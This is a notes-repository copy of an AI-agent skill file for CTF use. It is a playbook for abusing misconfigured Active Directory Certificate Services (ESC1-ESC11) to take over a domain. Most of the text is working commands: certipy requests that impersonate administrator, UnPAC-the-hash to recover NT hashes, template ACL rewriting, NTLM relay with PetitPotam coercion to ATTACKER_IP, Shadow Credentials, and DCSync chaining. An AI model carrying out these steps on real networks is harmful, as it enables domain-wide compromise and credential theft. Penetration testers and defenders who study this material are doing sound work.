# ADCS Certificate Abuse (ESC1-ESC8)

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/active-directory/adcs-esc.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/active-directory/adcs-esc.md)

---

---
name: adcs-esc
category: active-directory
triggers: ["adcs", "certipy", "ESC1", "ESC2", "ESC3", "ESC4", "ESC8", "certificate template", "pass the cert", "UnPAC the hash", "shadow credentials", "PKINIT", "web enrollment", "certfnsh"]
tools: ["certipy", "impacket-ntlmrelayx", "PKINITtools", "certipy-ad", "bloodyAD", "Rubeus"]
priority: high
description: Enumerate and exploit Active Directory Certificate Services misconfigurations (ESC1-ESC8) to obtain certificates that authenticate as privileged users.
---
# ADCS Certificate Abuse (ESC1-ESC8)

## Trigger context
An Active Directory Certificate Services CA is present and a certificate template (or the CA itself) is misconfigured. A vulnerable template lets a low-priv user request a certificate that authenticates (via PKINIT) as ANY user — commonly a Domain Admin or a DC. Certipy automates discovery and exploitation. This is one of the most reliable domain-takeover paths.

## Objective
`certipy find -vulnerable` to identify an ESC, request a certificate impersonating a privileged principal, then `certipy auth` to obtain that principal's TGT and NT hash (UnPAC-the-hash) for full compromise.

## Methodology (decision tree)
```
certipy find -vulnerable → which ESC?
├── ESC1  → template allows requester-supplied SAN + client auth EKU + low-priv enroll
│           → certipy req ... -upn administrator@corp.local → auth → DA
├── ESC2  → template has Any Purpose / no EKU → use as ESC3 or subordinate CA abuse
├── ESC3  → Enrollment Agent EKU → request "on behalf of" a privileged user
├── ESC4  → you have write over the template ACL → make it ESC1, exploit, restore
├── ESC6  → CA has EDITF_ATTRIBUTESUBJECTALTNAME2 → SAN injectable on ANY template
├── ESC7  → you control CA roles (ManageCA/ManageCertificates) → approve/enable → escalate
└── ESC8  → CA Web Enrollment (HTTP) + no EPA → relay coerced DC auth → DC cert (see ntlm-relay-coerce)
```

## Commands & payloads
```bash
# --- Enumerate ---
certipy find -u jdoe@corp.local -p 'Passw0rd!' -dc-ip DC_IP -stdout -vulnerable
certipy find -u jdoe@corp.local -p 'Passw0rd!' -dc-ip DC_IP           # full JSON/BloodHound output

# --- ESC1: requester supplies SAN, impersonate a DA ---
certipy req -u jdoe@corp.local -p 'Passw0rd!' -dc-ip DC_IP \
    -target CA_HOST -ca 'CORP-CA' -template 'VulnTemplate' -upn administrator@corp.local
# → writes administrator.pfx

# --- Authenticate with the cert: get TGT + NT hash (UnPAC-the-hash) ---
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# → prints NT hash for administrator and writes a .ccache

# --- 2022+ mapping: strong cert mapping may need a SID ---
certipy req -u jdoe@corp.local -p 'Passw0rd!' -target CA_HOST -ca 'CORP-CA' \
    -template 'VulnTemplate' -upn administrator@corp.local -sid S-1-5-21-...-500

# --- ESC3: enrollment agent, request on behalf of admin ---
certipy req -u jdoe@corp.local -p 'Passw0rd!' -target CA_HOST -ca 'CORP-CA' -template 'EnrollmentAgent'
certipy req -u jdoe@corp.local -p 'Passw0rd!' -target CA_HOST -ca 'CORP-CA' -template 'User' \
    -on-behalf-of 'corp\administrator' -pfx enrollmentagent.pfx

# --- ESC4: fix a writable template into ESC1, exploit, then restore ---
certipy template -u jdoe@corp.local -p 'Passw0rd!' -template 'VulnTemplate' -write-default-configuration
# ... run ESC1 req/auth ... then:
certipy template -u jdoe@corp.local -p 'Passw0rd!' -template 'VulnTemplate' -write-default-configuration -restore VulnTemplate.json

# --- ESC8: relay coerced DC auth to Web Enrollment (see ntlm-relay-coerce.md) ---
impacket-ntlmrelayx -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
python3 PetitPotam.py ATTACKER_IP DC_IP        # coerce DC → relay → DC$ cert
certipy auth -pfx dc.pfx -dc-ip DC_IP          # → DC$ hash → DCSync

# --- Shadow Credentials (ESC-adjacent: write on target's msDS-KeyCredentialLink) ---
certipy shadow auto -u jdoe@corp.local -p 'Passw0rd!' -account victimuser -dc-ip DC_IP
# → adds a key credential, authenticates via PKINIT, returns victim's NT hash
```

Windows equivalents: `Certify.exe find /vulnerable`, `Certify.exe request /ca:CA_HOST\CORP-CA /template:VulnTemplate /altname:administrator`, then `Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials` (UnPAC-the-hash). `Whisker.exe add /target:victim` for Shadow Credentials.

## Branching logic
- ESC1/ESC6 give a direct DA/DC impersonation cert -> `certipy auth` -> NT hash -> [sa--instructions--active-directory--dcsync-dump.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--dcsync-dump.md).
- ESC8 requires coercion -> chain with [sa--instructions--active-directory--ntlm-relay-coerce.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--ntlm-relay-coerce.md); the resulting DC$ cert -> DCSync.
- Cert obtained but auth fails with `KDC_ERR_CLIENT_NAME_MISMATCH` (post-2022 strong mapping) -> re-request with `-sid` of the target.
- Only have a PFX (no password recovery) -> "Pass-the-Cert": use the cert directly for LDAP/PKINIT (e.g. `certipy auth` -> TGT, then Pass-the-Ticket in pth-ptt-lateral).
- Write over a computer's `msDS-KeyCredentialLink` -> Shadow Credentials (`certipy shadow auto`) instead of a template ESC.

ESC quick-reference (what `certipy find -vulnerable` flags and the abuse primitive):
```
ESC1  Template: ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU + low-priv enroll  → -upn <admin>
ESC2  Template: Any Purpose EKU (or no EKU)                                     → use like ESC3
ESC3  Template: Certificate Request Agent EKU                                   → -on-behalf-of
ESC4  Template: writable ACL (GenericWrite/WriteDacl/Owner)                     → make ESC1, restore
ESC5  Writable PKI object / CA computer object                                 → template/CA takeover
ESC6  CA flag EDITF_ATTRIBUTESUBJECTALTNAME2                                    → SAN on ANY template
ESC7  CA role ManageCA / ManageCertificates                                    → approve/enable, then ESC1
ESC8  CA Web Enrollment over HTTP, no EPA                                       → relay coerced auth
ESC9/10 weak/no cert mapping (szOID / StrongCertificateBindingEnforcement)     → shadow creds + upn swap
ESC11 IF_ENFORCEENCICERTREQUEST off on ICertPassage RPC                        → relay to RPC endpoint
```

## Common pitfalls
- Clock skew breaks PKINIT -> sync to DC.
- `certipy` version differences: newer (4.x/5.x) unify `req`/`auth`; verify with `certipy version`. Flags shown are 4.x.
- CA host vs DC: `-target` is the CA server, `-dc-ip` is the DC — don't swap them.
- Strong certificate mapping (KB5014754, enforced 2023+) may require the `-sid` extension in the request.
- ESC8 needs Web Enrollment endpoint reachable over HTTP and EPA not enforced; HTTPS-only + EPA blocks it.
- The `.pfx` may be password-protected; certipy handles it, but note the password if prompted.

## Proof / verification
- `certipy auth -pfx administrator.pfx` prints `Got hash for 'administrator@corp.local': aad3b...:NTHASH`.
- Validate: `nxc smb DC_IP -u administrator -H NTHASH` -> `(Pwn3d!)`.
- Or use the emitted `.ccache`: `KRB5CCNAME=administrator.ccache nxc smb DC_HOST_FQDN -k`.

## Cross-references
- [sa--instructions--active-directory--ntlm-relay-coerce.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--ntlm-relay-coerce.md) — ESC8 coercion + relay chain.
- [sa--instructions--active-directory--dcsync-dump.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--dcsync-dump.md) — cash out the recovered admin/DC hash.
- [sa--instructions--active-directory--pth-ptt-lateral.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--pth-ptt-lateral.md) — Pass-the-Cert / Pass-the-Ticket with the emitted ccache.
- [sa--instructions--active-directory--ad-enum-bloodhound.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--ad-enum-bloodhound.md) — spot ADCS objects and write-access edges to templates.

## Credible sources
- https://www.thehacker.recipes/ad/movement/ad-cs/
- https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html
- https://github.com/ly4k/Certipy
- https://posts.specterops.io/certified-pre-owned-d95910965cd2
- https://www.netexec.wiki/ldap-protocol/find-adcs-servers
